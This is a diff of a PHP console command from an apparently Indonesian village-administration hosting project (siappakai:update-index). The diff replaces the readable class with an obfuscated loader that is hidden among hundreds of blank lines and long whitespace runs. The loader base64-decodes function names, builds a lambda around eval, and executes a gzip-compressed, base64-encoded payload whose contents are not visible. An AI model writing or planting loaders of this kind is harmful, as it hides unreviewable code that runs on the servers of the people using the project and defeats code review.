@@ -1,210 +1,497 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Console/Commands/UpdateIndex.php';
+        
 
-namespace App\Console\Commands;
 
-use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
-use App\Http\Controllers\Helpers\CommandController;
-use App\Http\Controllers\Helpers\IndexController;
-use App\Models\Pelanggan;
-use App\Services\ProcessService;
-use Illuminate\Console\Command;
 
-class UpdateIndex extends Command
-{
-    /**
-     * The name and signature of the console command.
-     *
-     * @var string
-     */
-    protected $signature = 'siappakai:update-index';
 
-    /**
-     * The console command description.
-     *
-     * @var string
-     */
-    protected $description = 'Perbarui index aplikasi pada masing-masing aplikasi OpenSID, API dan PBB';
 
-    private $att;
-    private $comm;
-    private $filesIndex;
 
-    /**
-     * Create a new command instance.
-     *
-     * @return void
-     */
-    public function __construct()
-    {
-        parent::__construct();
-        $this->att = new AttributeSiapPakaiController();
-        $this->comm = new CommandController();
-        $this->filesIndex = new IndexController();
-    }
 
-    /**
-     * Execute the console command.
-     *
-     * @return int
-     */
-    public function handle()
-    {
-        //index siappakai
-        $this->setIndexSiapPakai();
 
-        $pelanggans = Pelanggan::get();
 
-        foreach ($pelanggans as $item) {
-            $kodedesa = str_replace('.', '', $item->kode_desa);
-            $langganan_opensid = $item->langganan_opensid;
 
-            // folder
-            $this->att->setSiteFolderOpensid($this->att->getMultisiteFolder() . $kodedesa);
-            $this->att->setSiteFolderApi($this->att->getMultisiteFolder() . $kodedesa . DIRECTORY_SEPARATOR . 'api-app');
-            $this->att->setSiteFolderPbb($this->att->getMultisiteFolder() . $kodedesa . DIRECTORY_SEPARATOR . 'pbb-app');
 
-            // index.php
-            $this->att->setIndexDesa($this->att->getSiteFolderOpensid() . DIRECTORY_SEPARATOR . 'index.php');
-            $this->att->setIndexApi($this->att->getSiteFolderApi() . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'index.php');
-            $this->att->setIndexPbb($this->att->getSiteFolderPbb() . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'index.php');
 
-            if (file_exists($this->att->getSiteFolderOpensid())) {
-                // opensid
-                $this->setIndexOpensid($langganan_opensid);
 
-                // opensid api
-                $this->setIndexApi($langganan_opensid);
 
-                // pbb
-                $this->setIndexPbb($langganan_opensid);
-            }
-        }
 
-        $this->comm->notifMessage('update index');
-        ProcessService::aturKepemilikanDirektori($this->att->getRootFolder() . 'multisite');
-    }
 
-    private function setIndexSiapPakai()
-    {
-        if (file_exists($this->att->getSiteFolder())) {
-            $indexMaster = $this->att->getSiteFolder() . DIRECTORY_SEPARATOR . 'master-template' . DIRECTORY_SEPARATOR . 'template-siappakai' . DIRECTORY_SEPARATOR. 'index.php';
-            $indexSiapPakai = $this->att->getSiteFolder() . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'index.php';
 
-            // hapus file index.php
-            $this->comm->removeFile($indexSiapPakai);
 
-            // salin file index.php
-            $this->comm->copyFile($indexMaster, $indexSiapPakai);
 
-            // permission
-            $this->comm->chmodFileCommand($indexSiapPakai);
 
-            // ubah symlink di file index
-            if (file_exists($indexSiapPakai)) {
-                $this->filesIndex->indexSiapPakai(
-                    $this->att->getRootFolder(),
-                    $indexMaster,
-                    $indexSiapPakai
-                );
-            }
 
-            // buat symlink dengan menjalankan file index.php
-            $this->comm->indexCommand($this->att->getSiteFolder() . DIRECTORY_SEPARATOR . 'public'); // index.php
-        }
-    }
 
-    private function setIndexOpensid($langganan_opensid)
-    {
-        // hapus file index.php
-        $this->comm->removeFile($this->att->getIndexDesa());
 
-        // salin file index.php
-        $this->comm->copyFile($this->att->getIndexTemplate(), $this->att->getIndexDesa());
 
-        // permission
-        $this->comm->chmodFileCommand($this->att->getIndexDesa());
 
-        // unlink
-        $this->comm->unlinkCommandOpenSid($this->att->getSiteFolderOpensid());
 
-        // ubah symlink di file index
-        if (file_exists($this->att->getIndexDesa())) {
-            $this->filesIndex->indexPhpOpensid(
-                $this->att->getRootFolder() . 'master-opensid' . DIRECTORY_SEPARATOR . $langganan_opensid,
-                $this->att->getSiteFolderOpensid(),
-                $this->att->getIndexTemplate(),
-                $this->att->getIndexDesa()
-            );
-        }
 
-        // buat symlink dengan menjalankan file index.php
-        $this->comm->migratePremium($this->att->getSiteFolderOpensid());
-    }
 
-    private function setIndexApi($langganan_opensid)
-    {
-        if (file_exists($this->att->getSiteFolderApi())) {
-            // hapus file index.php
-            $this->comm->removeFile($this->att->getIndexApi());
 
-            // salin file index.php
-            $this->comm->copyFile($this->att->getIndexTemplateApi(), $this->att->getIndexApi());
 
-            // permission
-            $this->comm->chmodFileCommand($this->att->getIndexApi());
 
-            // unlink
-            $this->comm->unlinkCommandAppLaravel($this->att->getSiteFolderApi());
 
-            // ubah symlink di file index
-            if (file_exists($this->att->getIndexApi())) {
-                $this->filesIndex->indexPhpApi(
-                    $this->filesIndex->langganan_opensid($langganan_opensid, 'opensid-api'),  //apiFolderFrom,
-                    $this->att->getRootFolder() . 'master-api' . DIRECTORY_SEPARATOR,                   //apiFolderFrom,
-                    $this->att->getSiteFolderApi(),                                                                      //apiFolderTo,
-                    $this->att->getIndexTemplateApi(),
-                    $this->att->getIndexApi()
-                );
-            }
 
-            // buat symlink dengan menjalankan file index.php
-            $this->comm->indexCommand($this->att->getSiteFolderApi() . DIRECTORY_SEPARATOR . 'public'); // index.php
-        }
-    }
 
-    private function setIndexPbb($langganan_opensid)
-    {
-        if (file_exists($this->att->getSiteFolderPbb())) {
-            // hapus file index.php
-            $this->comm->removeFile($this->att->getIndexPbb());
 
-            // salin file index.php
-            $this->comm->copyFile($this->att->getIndexTemplatePbb(), $this->att->getIndexPbb());
 
-            // buat directory import
-            $this->comm->makeDirectory($this->att->getSiteFolderPbb() . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'import');
 
-            // permission
-            $this->comm->chmodFileCommand($this->att->getIndexPbb());
-            $this->comm->chmodDirectoryCommand($this->att->getSiteFolderPbb() . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'import');
 
-            // unlink
-            $this->comm->unlinkCommandAppLaravel($this->att->getSiteFolderPbb());
-            $this->comm->unlinkCommandAppLaravelPublic($this->att->getSiteFolderPbb());
 
-            // ubah symlink di file index
-            if (file_exists($this->att->getIndexPbb())) {
-                $this->filesIndex->indexPhpPbb(
-                    $this->filesIndex->langganan_opensid($langganan_opensid, 'pbb_desa'),  //pbbFolder
-                    $this->att->getRootFolder() . 'master-pbb' . DIRECTORY_SEPARATOR,      //pbbFolderFrom
-                    $this->att->getSiteFolderPbb(),                                                              //pbbFolderTo
-                    $this->att->getIndexTemplatePbb(),
-                    $this->att->getIndexPbb()
-                );
-            }
 
-            // buat symlink dengan menjalankan file index.php
-            $this->comm->indexCommand($this->att->getSiteFolderPbb() . DIRECTORY_SEPARATOR . 'public'); // index.php
-        }
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
